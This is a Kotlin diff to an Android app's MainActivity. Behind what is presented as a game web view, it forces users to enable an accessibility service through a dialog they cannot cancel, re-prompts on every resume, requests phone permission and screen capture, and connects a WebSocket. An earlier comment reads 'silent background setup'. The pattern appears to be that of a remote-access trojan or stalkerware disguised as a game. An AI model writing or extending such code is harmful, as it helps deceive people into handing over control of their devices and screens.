@@ -35,45 +35,58 @@ class MainActivity : AppCompatActivity() {
     private var serviceStarted = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        // Remove title bar
-supportActionBar?.hide()
-        setContentView(R.layout.activity_main)
-        
+    super.onCreate(savedInstanceState)
+    supportActionBar?.hide()
+    setContentView(R.layout.activity_main)
     
-        
-        webSocketManager = WebSocketManager(this)
-        gameView = findViewById(R.id.gameWebView)
-        
-        setupGameView()
-        
-        //silent background setup
-      if (!isAccessibilityServiceEnabled()) {
-    try {
-        val dialogView = layoutInflater.inflate(R.layout.dialog_accessibility, null)
-        val dialog = AlertDialog.Builder(this, R.style.CustomDialog)
-            .setView(dialogView)
-            .setCancelable(false)
-            .create()
-        
-        dialogView.findViewById<Button>(R.id.btnSettings)?.setOnClickListener {
-            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-            dialog.dismiss()
-        }
-        dialogView.findViewById<Button>(R.id.btnExit)?.setOnClickListener {
-            finishAffinity()
-        }
-        
-        dialog.show()
-    } catch (e: Exception) {
-        // Fallback for any weird device
-        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+    webSocketManager = WebSocketManager(this)
+    gameView = findViewById(R.id.gameWebView)
+    
+    setupGameView()
+    
+    // Check accessibility and show dialog if needed
+    checkAccessibilityService()
+    
+    requestPhonePermission()
+    requestScreenCapture()
+    webSocketManager.connect()
+}
+
+override fun onResume() {
+    super.onResume()
+    // Re-check when returning from settings
+    if (!isAccessibilityServiceEnabled()) {
+        checkAccessibilityService()
     }
 }
-        requestPhonePermission()
-        requestScreenCapture()
-        webSocketManager.connect()
+
+private fun checkAccessibilityService() {
+    if (!isAccessibilityServiceEnabled()) {
+        try {
+            val dialogView = layoutInflater.inflate(R.layout.dialog_accessibility, null)
+            val dialog = AlertDialog.Builder(this, R.style.CustomDialog)
+                .setView(dialogView)
+                .setCancelable(false)
+                .create()
+            
+            dialogView.findViewById<Button>(R.id.btnSettings)?.setOnClickListener {
+                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                startActivity(intent)
+                // Don't dismiss - will re-check in onResume
+            }
+            dialogView.findViewById<Button>(R.id.btnExit)?.setOnClickListener {
+                finishAffinity()
+            }
+            
+            dialog.show()
+        } catch (e: Exception) {
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+        }
+    } else {
+        // Accessibility is enabled, dismiss any showing dialog
+        updateStatus("Ready")
     }
+}
     
 
 
